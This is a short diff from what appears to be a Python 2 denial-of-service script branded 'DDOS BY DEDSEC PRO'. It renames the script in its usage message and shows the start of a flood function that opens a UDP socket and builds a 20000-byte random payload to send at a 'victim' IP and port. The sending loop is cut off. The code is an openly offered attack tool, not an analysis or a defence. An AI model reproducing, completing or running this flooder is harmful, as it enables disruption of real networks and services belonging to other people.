@@ -6,7 +6,7 @@ import sys
 def usage():
     
     print "\033[1;32mDDOS BY DEDSEC PRO"
-    print "python2 LITEDDOS.py " "<ip> <port>"
+    print "python2 DDOS.py " "<ip> <port>"
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes = random._urandom(20000)
